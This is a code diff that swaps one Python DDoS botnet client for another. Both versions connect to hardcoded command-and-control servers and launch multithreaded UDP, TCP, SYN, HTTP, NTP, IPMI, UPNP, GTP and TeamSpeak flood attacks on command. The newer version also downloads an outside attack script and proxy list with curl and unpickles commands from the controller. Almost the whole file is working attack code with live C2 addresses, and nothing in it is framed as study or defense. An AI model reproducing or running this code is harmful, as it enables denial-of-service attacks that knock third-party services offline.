@@ -1,162 +1,179 @@
-# PYbot - A simple Python botnet
-# Author: WodX
-# Date: 27/09/2019
-# Bot
-
-import socket 
-import threading
+import socket
+import os
+import pickle
+import sys
 import time
+import threading
 import random
 
-# Configuration
-C2_ADDRESS  = 'nl2-4.deploy.sbs'
-C2_PORT     = 65303
+#setup
+os.system("yum update -y && yum install nodejs -y && yum install python3 -y")
+os.system("npm i minimist cloudscraper")
+os.system("pip3 install cloudscraper socks pysocks colorama undetected_chromedriver httpx")
 
-base_user_agents = [
-    'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Firefox/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
-    'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Chrome/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
-    'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Safari/%.1f.%.1f',
-    'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Chrome/%.1f.%.1f',
-    'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Firefox/%.1f.%.1f',
-]
+os.system("curl -o resouces/ua.txt https://raw.githubusercontent.com/HyukIsBack/KARMA-DDoS/main/resources/ua.txt")
+os.system("curl -o cfb.py https://raw.githubusercontent.com/HyukIsBack/KARMA-DDoS/main/main.py")
 
-def rand_ua():
-    return random.choice(base_user_agents) % (random.random() + 5, random.random() + random.randint(1, 8), random.random(), random.randint(2000, 2100), random.randint(92215, 99999), (random.random() + random.randint(3, 9)), random.random())
+def msgrec(conn):
+    while True:
+        msg = conn.recv(99)
+        if not msg.decode('utf-8') == '\r\n':break
+    return msg.decode('UTF-8').strip()
+CNCIP = "40.124.115.135"
+CNCPORT = 1337
+sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+sock.connect((CNCIP,CNCPORT))
 
-def attack_vse(ip, port, secs):
-    payload = b'\xff\xff\xff\xffTSource Engine Query\x00' # read more at https://developer.valvesoftware.com/wiki/Server_queries
-    while time.time() < secs:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.sendto(payload, (ip, port))
-
-def attack_udp(ip, port, secs, size):
-    while time.time() < secs:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        dport = random.randint(1, 65535) if port == 0 else port
-        data = random._urandom(size)
-        s.sendto(data, (ip, dport))
-
-def attack_tcp(ip, port, secs, size):
-    while time.time() < secs:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        try:
-            s.connect((ip, port))
-            while time.time() < secs:
-                s.send(random._urandom(size))
-        except:
-            pass
-
-def attack_syn(ip, port, secs):
-    while time.time() < secs:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.setblocking(0)
-        try:
-            dport = random.randint(1, 65535) if port == 0 else port
-            s.connect((ip, dport)) # RST/ACK or SYN/ACK as response
-        except:
-            pass
-
-def attack_http(ip, secs):
-    while time.time() < secs:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        try:
-            s.connect((ip, 5050))
-            while time.time() < secs:
-                s.send(f'GET / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {rand_ua()}\r\nConnection: keep-alive\r\n\r\n'.encode())
-        except:
-            s.close()
-
-def main():
-    c2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    c2.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
-
-    while 1:
-        try:
-            c2.connect((C2_ADDRESS, C2_PORT))
-
-            while 1:
-                data = c2.recv(1024).decode()
-                if 'Username' in data:
-                    c2.send('BOT'.encode())
-                    break
-
-            while 1:
-                data = c2.recv(1024).decode()
-                if 'Password' in data:
-                    c2.send('\xff\xff\xff\xff\75'.encode('cp1252'))
-                    break
-
+def method_ntp(ip,port,attacktime):
+    timeout = time.time() + attacktime
+    os.system(f'./ntp {ip} {port} ntpout.txt 100 -1 {attacktime}')
+    sys.exit()
+def method_std(ip,port,attacktime):
+    data = random._urandom(1024)
+    addr = (ip,port)
+    flood = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+    timeout = time.time() + attacktime
+    while True:
+        if time.time() > timeout:
             break
-        except:
-            time.sleep(10) # retry in 2 mins if connection fails
-
-    while 1:
-        try:
-            data = c2.recv(1024).decode().strip()
-            if not data:
-                break
-
-            args = data.split(' ')
-            command = args[0].upper()
-
-            if command == '.VSE':
-                ip = args[1]
-                port = int(args[2])
-                secs = time.time() + int(args[3])
-                threads = int(args[4])
-
-                for _ in range(threads):
-                    threading.Thread(target=attack_vse, args=(ip, port, secs), daemon=True).start()
-
-            elif command == '.UDP':
-                ip = args[1]
-                port = int(args[2])
-                secs = time.time() + int(args[3])
-                size = int(args[4])
-                threads = int(args[5])
-
-                for _ in range(threads):
-                    threading.Thread(target=attack_udp, args=(ip, port, secs, size), daemon=True).start()
-
-            elif command == '.TCP':
-                ip = args[1]
-                port = int(args[2])
-                secs = time.time() + int(args[3])
-                size = int(args[4])
-                threads = int(args[5])
-
-                for _ in range(threads):
-                    threading.Thread(target=attack_tcp, args=(ip, port, secs, size), daemon=True).start()
-
-            elif command == '.SYN':
-                ip = args[1]
-                port = int(args[2])
-                secs = time.time() + int(args[3])
-                threads = int(args[4])
-
-                for _ in range(threads):
-                    threading.Thread(target=attack_syn, args=(ip, port, secs), daemon=True).start()
-
-            elif command == '.HTTP':
-                ip = args[1]
-                secs = time.time() + int(args[2])
-                threads = int(args[3])
-
-                for _ in range(threads):
-                    threading.Thread(target=attack_http, args=(ip, secs), daemon=True).start()
-
-            elif command == 'PING':
-                c2.send('PONG'.encode())
-
-        except:
+        flood.sendto(data,addr)
+    flood.close()
+    sys.exit()
+def method_RCMP(ip,port,attacktime):
+    data = ['\x06\x00\xff\x06','\x00\x00\x11\xbe','\x80\x00\x00\x00']
+    addr = (ip,port)
+    flood = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+    timeout = time.time() + attacktime
+    while True:
+        if time.time() > timeout:
             break
-
-    c2.close()
-
-    main()
-
-if __name__ == '__main__':
+        for i in range(3):
+            flood.sendto(data[i],addr)
+    food.close()
+    sys.exit()
+def method_IPMI(ip,port,attacktime):
+    data = ['\x06\x00\xff\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x09\x20\x18','\xc8\x81\x00\x38\x8e\x04\xb5']
+    addr = (ip,port)
+    flood = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+    timeout = time.time() + attacktime
+    while True:
+        if time.time() > timeout:
+            break
+        for i in range(2):
+            flood.sendto(data[i],addr)
+    flood.close()
+    sys.exit()
+def method_UPNP(ip,port,attacktime):
+    data = ['\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x01\x86\xA3','\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00','\x00\x00\x00\x00\x00\x00\x00\x00']
+    addr = (ip,port)
+    flood = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+    timeout = time.time() + attacktime
+    while True:
+        if time.time() > timeout:
+            break
+        for i in range(3):
+            flood.sendto(data[i],addr)
+    flood.close()
+    sys.exit()
+def method_GTP1(ip,port,attacktime):
+    data = ['\x32','\x01','\x00\x04','\x00\x00\x42\x00','\x13\x37','\x00','\x00']
+    addr = (ip,port)
+    flood = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+    timeout = time.time() + attacktime
+    while True:
+        if time.time() > timeout:
+            break
+        for i in range(7):
+            flood.sendto(data[i],addr)
+    flood.close()
+    sys.exit()
+def method_GTP2(ip,port,attacktime):
+    data = ['\x4e','\x01','\x00\x04','\xde\xfe\xc8\x00']
+    addr = (ip,port)
+    flood = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+    timeout = time.time() + attacktime
+    while True:
+        if time.time() > timeout:
+            break
+        for i in range(4):
+            flood.sendto(data[i],addr)
+    flood.close()
+    sys.exit()
+def method_ts2(ip,port,attacktime):
+    data = '\xf4\xbe\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x002x\xba\x85\tTeamSpeak\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\nWindows XP\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00 \x00<\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08nickname\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
+    addr = (ip,port)
+    flood = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+    timeout = time.time() + attacktime
+    while True:
+        if time.time() > timeout:
+            break
+        flood.sendto(data,addr)
+    flood.close()
+    sys.exit()
+def method_tcprand(ip,port,attacktime):
+    data = random._urandom(16)
+    addr = (ip,port)
+    flood = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    timeout = time.time() + attacktime
+    flood.connect(addr)
+    while True:
+        if time.time() > timeout:
+            break
+        flood.send(data)
+    flood.close()
+    sys.exit()
+def method_CFB(ip,attacktime):
+    import os
+    os.system(f"python3 cfb.py cfb {ip} 200 {attacktime}")
+def method_PXCFB(ip,attacktime):
+    import os
+    os.system("curl -o proxy.txt https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all")
+    os.system(f"python3 cfb.py pxcfb {ip} 200 {attacktime}")
+while True:
+    data = sock.recv(99)
     try:
-        main()
+        if data.decode('UTF-8') == 'foo':
+            sock.sendall(b'bar')
     except:
-        pass
+        attack = pickle.loads(data)
+        if attack[0] == 'NTP':
+            th = threading.Thread(target=method_ntp, args=[attack[1],attack[2],attack[3]])
+            th.start()
+        if attack[0] == 'CFB':
+            th = threading.Thread(target=method_CFB, args=[attack[1],attack[2]])
+            th.start()
+        if attack[0] == 'PXCFB':
+            th = threading.Thread(target=method_CFB, args=[attack[1],attack[2]])
+            th.start()
+        elif attack[0] == 'STD':
+            for a in range(100):
+                th = threading.Thread(target=method_std, args=[attack[1],attack[2],attack[3]])
+                th.start()
+        elif attack[0] == 'UPNP':
+            for a in range(100):
+                th = threading.Thread(target=method_UPNP, args=[attack[1],attack[2],attack[3]])
+                th.start()
+        elif attack[0] == 'RCMP':
+            for a in range(100):
+                th = threading.Thread(target=method_RCMP, args=[attack[1],attack[2],attack[3]])
+                th.start()
+        elif attack[0] == 'IPMI':
+            for a in range(100):
+                th = threading.Thread(target=method_IPMI, args=[attack[1],attack[2],attack[3]])
+                th.start()
+        elif attack[0] == 'TCPRAND':
+            for a in range(100):
+                th = threading.Thread(target=method_tcprand, args=[attack[1],attack[2],attack[3]])
+                th.start()
+        elif attack[0] == 'TS2':
+            for a in range(100):
+                th = threading.Thread(target=method_ts2, args=[attack[1],attack[2],attack[3]])
+                th.start()
+        elif attack[0] == 'GTP1':
+            for a in range(100):
+                th = threading.Thread(target=method_GTP1, args=[attack[1],attack[2],attack[3]])
+                th.start()
+        elif attack[0] == 'GTP2':
+            for a in range(100):
+                th = threading.Thread(target=method_GTP2, args=[attack[1],attack[2],attack[3]])
+                th.start()
